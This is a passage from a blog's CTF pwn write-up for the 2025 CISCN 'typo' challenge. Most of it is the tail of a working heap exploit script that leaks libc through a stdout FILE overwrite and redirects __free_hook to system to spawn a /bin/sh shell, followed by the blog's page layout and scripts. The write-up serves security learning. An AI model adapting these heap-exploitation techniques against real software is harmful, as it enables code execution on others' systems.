class="line">edit(<span class="number">0</span>,myencode(payload),<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x80</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x91</span>)</span><br><span class="line">payload+=p64(<span class="number">0xa0</span>)</span><br><span class="line">edit(<span class="number">0</span>,myencode(payload),<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x401</span>)+<span class="string">b&#x27;\x98&#x27;</span>+<span class="string">b&#x27;\x26&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">9999</span>),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">payload=p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">9999</span>),payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc_base = get_addr() -<span class="number">0x1ec980</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">libc.address = libc_base</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">ordinal = libc_base + <span class="number">0x1ecfd0</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload=p64(<span class="number">0x80</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x91</span>)</span><br><span class="line">payload+=p64(free_hook - <span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,myencode(payload),<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">12</span>,<span class="built_in">str</span>(<span class="number">9999</span>),p64(system))</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x80</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x91</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,myencode(payload),<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://bailan2.github.io">摆烂小子</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://bailan2.github.io/2025/08/21/Pwn-%E9%AB%98%E8%B4%A8%E9%87%8F%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B06-2025CISCN%E5%A4%A9%E6%B4%A5%E5%8D%8A%E5%86%B3%E8%B5%9B/">https://bailan2.github.io/2025/08/21/Pwn-%E9%AB%98%E8%B4%A8%E9%87%8F%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B06-2025CISCN%E5%A4%A9%E6%B4%A5%E5%8D%8A%E5%86%B3%E8%B5%9B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/./img/pwn.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/title.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">摆烂小子</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">97</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://mail.qq.com/" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2025-CISCN-amp-%E9%95%BF%E5%9F%8E%E6%9D%AF-PWN"><span class="toc-number">1.</span> <span class="toc-text">2025 CISCN &amp; 长城杯 PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#typo"><span class="toc-number">1.1.</span> <span class="toc-text">typo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/10/Pwn-%E9%AB%98%E8%B4%A8%E9%87%8F%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B07-2025%E6%B9%BE%E5%8C%BA%E6%9D%AF%E5%88%9D%E8%B5%9B/" title="Pwn-高质量比赛题目复现7-2025湾区杯初赛"><img src="/./img/pwn.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pwn-高质量比赛题目复现7-2025湾区杯初赛"/></a><div class="content"><a class="title" href="/2025/09/10/Pwn-%E9%AB%98%E8%B4%A8%E9%87%8F%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B07-2025%E6%B9%BE%E5%8C%BA%E6%9D%AF%E5%88%9D%E8%B5%9B/" title="Pwn-高质量比赛题目复现7-2025湾区杯初赛">Pwn-高质量比赛题目复现7-2025湾区杯初赛</a><time datetime="2025-09-10T07:10:35.000Z" title="Created 2025-09-10 15:10:35">2025-09-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/10/test/" title="test"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="test"/></a><div class="content"><a class="title" href="/2025/09/10/test/" title="test">test</a><time datetime="2025-09-10T07:10:03.000Z" title="Created 2025-09-10 15:10:03">2025-09-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/21/Pwn-%E9%AB%98%E8%B4%A8%E9%87%8F%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B06-2025CISCN%E5%A4%A9%E6%B4%A5%E5%8D%8A%E5%86%B3%E8%B5%9B/" title="Pwn-高质量比赛题目复现6-2025CISCN天津半决赛"><img src="/./img/pwn.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pwn-高质量比赛题目复现6-2025CISCN天津半决赛"/></a><div class="content"><a class="title" href="/2025/08/21/Pwn-%E9%AB%98%E8%B4%A8%E9%87%8F%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B06-2025CISCN%E5%A4%A9%E6%B4%A5%E5%8D%8A%E5%86%B3%E8%B5%9B/" title="Pwn-高质量比赛题目复现6-2025CISCN天津半决赛">Pwn-高质量比赛题目复现6-2025CISCN天津半决赛</a><time datetime="2025-08-21T04:57:29.000Z" title="Created 2025-08-21 12:57:29">2025-08-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/08/Android-r0%E6%8A%93%E5%8C%85%E9%80%9A%E6%9D%80/" title="Android-r0抓包通杀"><img src="/./img/android.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android-r0抓包通杀"/></a><div class="content"><a class="title" href="/2025/07/08/Android-r0%E6%8A%93%E5%8C%85%E9%80%9A%E6%9D%80/" title="Android-r0抓包通杀">Android-r0抓包通杀</a><time datetime="2025-07-08T12:19:30.000Z" title="Created 2025-07-08 20:19:30">2025-07-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/22/Android-%E7%8C%BF%E4%BA%BA%E5%AD%A6%E7%88%AC%E8%99%AB%E7%BB%83%E4%B9%A0/" title="Android-猿人学爬虫练习"><img src="/./img/android.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android-猿人学爬虫练习"/></a><div class="content"><a class="title" href="/2025/06/22/Android-%E7%8C%BF%E4%BA%BA%E5%AD%A6%E7%88%AC%E8%99%AB%E7%BB%83%E4%B9%A0/" title="Android-猿人学爬虫练习">Android-猿人学爬虫练习</a><time datetime="2025-06-22T08:21:41.000Z" title="Created 2025-06-22 16:21:41">2025-06-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/./img/pwn.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By 摆烂小子</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">簡</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://bailan2.github.io/2025/08/21/Pwn-%E9%AB%98%E8%B4%A8%E9%87%8F%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B06-2025CISCN%E5%A4%A9%E6%B4%A5%E5%8D%8A%E5%86%B3%E8%B5%9B/'
+    this.page.identifier = '2025/08/21/Pwn-高质量比赛题目复现6-2025CISCN天津半决赛/'
+    this.page.title = 'Pwn-高质量比赛题目复现6-2025CISCN天津半决赛'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><div class="aplayer no-destroy" data-id="7399261759" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
